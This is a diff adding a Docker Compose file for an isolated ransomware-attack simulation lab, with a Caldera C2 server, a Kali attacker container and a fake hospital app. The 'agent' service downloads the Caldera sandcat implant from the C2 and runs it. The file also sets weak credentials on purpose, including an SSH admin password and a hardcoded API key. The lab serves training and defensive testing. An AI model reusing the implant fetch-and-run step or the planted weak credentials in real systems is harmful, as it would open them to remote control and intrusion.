@@ -1,0 +1,219 @@
+# =============================================================================
+# Full Simulation Mode - Realistic Ransomware Attack Scenario
+# =============================================================================
+# Three isolated subnets connected by a router/firewall container:
+#   - attack_net  (10.10.1.0/24): Attacker tools + Caldera C2
+#   - dmz_net     (10.10.2.0/24): Public-facing services (reverse proxy, frontend)
+#   - internal_net(10.10.3.0/24): Backend API, database, internal services
+# =============================================================================
+
+networks:
+  attack_net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 10.10.1.0/24
+          gateway: 10.10.1.1
+
+  dmz_net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 10.10.2.0/24
+          gateway: 10.10.2.1
+
+  internal_net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 10.10.3.0/24
+          gateway: 10.10.3.1
+
+services:
+  # ===========================================================================
+  # ROUTER / FIREWALL - connects the three networks with iptables rules
+  # ===========================================================================
+  router:
+    image: alpine:latest
+    container_name: sim_router
+    networks:
+      attack_net:
+        ipv4_address: 10.10.1.254
+      dmz_net:
+        ipv4_address: 10.10.2.254
+      internal_net:
+        ipv4_address: 10.10.3.254
+    cap_add:
+      - NET_ADMIN
+    command: >
+      sh -c "
+        apk add --no-cache iptables &&
+        sysctl -w net.ipv4.ip_forward=1 &&
+        iptables -P FORWARD DROP &&
+        iptables -A FORWARD -i eth0 -o eth1 -p tcp --dport 80 -j ACCEPT &&
+        iptables -A FORWARD -i eth0 -o eth1 -p tcp --dport 443 -j ACCEPT &&
+        iptables -A FORWARD -i eth1 -o eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT &&
+        iptables -A FORWARD -i eth1 -o eth2 -p tcp --dport 8000 -j ACCEPT &&
+        iptables -A FORWARD -i eth2 -o eth1 -m state --state ESTABLISHED,RELATED -j ACCEPT &&
+        iptables -A FORWARD -i eth0 -o eth2 -j DROP &&
+        echo 'Firewall rules applied' &&
+        tail -f /dev/null
+      "
+    restart: unless-stopped
+
+  # ===========================================================================
+  # ATTACK NETWORK
+  # ===========================================================================
+  caldera:
+    image: ghcr.io/mitre/caldera:5.2.0
+    container_name: sim_caldera
+    networks:
+      attack_net:
+        ipv4_address: 10.10.1.10
+    ports:
+      - "8888:8888"
+      - "8443:8443"
+    environment:
+      - WORKSPACE=/usr/src/app
+    volumes:
+      - ../caldera/adversaries:/usr/src/app/data/adversaries
+      - ../caldera/abilities:/usr/src/app/data/abilities
+      - ../caldera/sources:/usr/src/app/data/sources
+      - ../caldera/conf/local.yml:/usr/src/app/conf/local.yml
+
+  attacker:
+    image: kalilinux/kali-rolling
+    container_name: sim_attacker
+    networks:
+      attack_net:
+        ipv4_address: 10.10.1.20
+    cap_add:
+      - NET_ADMIN
+    command: >
+      sh -c "
+        apt-get update -qq &&
+        apt-get install -y -qq nmap nikto curl netcat-openbsd hydra > /dev/null 2>&1 &&
+        echo 'Attacker tools ready' &&
+        tail -f /dev/null
+      "
+    restart: unless-stopped
+
+  # ===========================================================================
+  # DMZ NETWORK
+  # ===========================================================================
+  reverse-proxy:
+    image: nginx:alpine
+    container_name: sim_reverse_proxy
+    networks:
+      dmz_net:
+        ipv4_address: 10.10.2.10
+    ports:
+      - "80:80"
+    volumes:
+      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
+    depends_on:
+      - frontend
+      - api
+    restart: unless-stopped
+
+  frontend:
+    image: node:20-alpine
+    container_name: sim_frontend
+    networks:
+      dmz_net:
+        ipv4_address: 10.10.2.20
+    working_dir: /app
+    environment:
+      - VITE_API_URL=http://localhost/api
+    volumes:
+      - ../frontend:/app
+    command: sh -c "npm install && npm run dev -- --host 0.0.0.0"
+
+  ssh-target:
+    image: lscr.io/linuxserver/openssh-server:latest
+    container_name: sim_ssh_target
+    networks:
+      dmz_net:
+        ipv4_address: 10.10.2.40
+    environment:
+      - PUID=1000
+      - PGID=1000
+      - PASSWORD_ACCESS=true
+      - USER_NAME=admin
+      - USER_PASSWORD=hospital2024
+    restart: unless-stopped
+
+  # ===========================================================================
+  # INTERNAL NETWORK
+  # ===========================================================================
+  api:
+    image: ghcr.io/astral-sh/uv:python3.10-bookworm-slim
+    container_name: sim_api
+    networks:
+      dmz_net:
+        ipv4_address: 10.10.2.30
+      internal_net:
+        ipv4_address: 10.10.3.10
+    working_dir: /app
+    environment:
+      - CALDERA_URL=http://10.10.1.10:8888
+      - CALDERA_API_KEY=ADMIN123
+      - SIMULATION_MODE=true
+    volumes:
+      - ../:/app
+    command: >
+      sh -c "uv sync &&
+      uv run uvicorn api.main:app --host 0.0.0.0 --port 8000"
+
+  agent:
+    image: alpine:latest
+    container_name: sim_agent
+    networks:
+      internal_net:
+        ipv4_address: 10.10.3.20
+      attack_net:
+        ipv4_address: 10.10.1.30
+    depends_on:
+      - api
+    restart: on-failure
+    environment:
+      - CALDERA_URL=http://10.10.1.10:8888
+    volumes:
+      - ../:/app
+    command: >
+      sh -c "apk add --no-cache curl openssl &&
+      while true; do
+        HTTP_STATUS=$$(curl -s -o sandcat.go -w '%{http_code}' -X POST
+          -H 'file:sandcat.go' -H 'platform:linux'
+          $${CALDERA_URL}/file/download);
+        if [ \"$$HTTP_STATUS\" = '200' ] && [ -s sandcat.go ]; then
+          echo 'Agent downloaded successfully.';
+          break;
+        fi;
+        echo \"Waiting for Caldera at $${CALDERA_URL}... (status: $$HTTP_STATUS)\";
+        rm -f sandcat.go;
+        sleep 5;
+      done &&
+      chmod +x sandcat.go &&
+      ./sandcat.go -server $${CALDERA_URL} -group red_team"
+
+  # ===========================================================================
+  # SUPPORT SERVICES
+  # ===========================================================================
+  traffic-generator:
+    image: alpine:latest
+    container_name: sim_traffic_gen
+    networks:
+      dmz_net:
+        ipv4_address: 10.10.2.60
+    depends_on:
+      - reverse-proxy
+    command: >
+      sh -c "apk add --no-cache curl &&
+      sleep 30 &&
+      while true; do
+        curl -s http://10.10.2.10/api/patients/?skip=$$(shuf -i 0-100 -n 1)\&limit=10 > /dev/null 2>&1;
+        curl -s http://10.10.2.10/ > /dev/null 2>&1;
+        sleep $$(shuf -i 1-5 -n 1);
+      done"
+    restart: unless-stopped
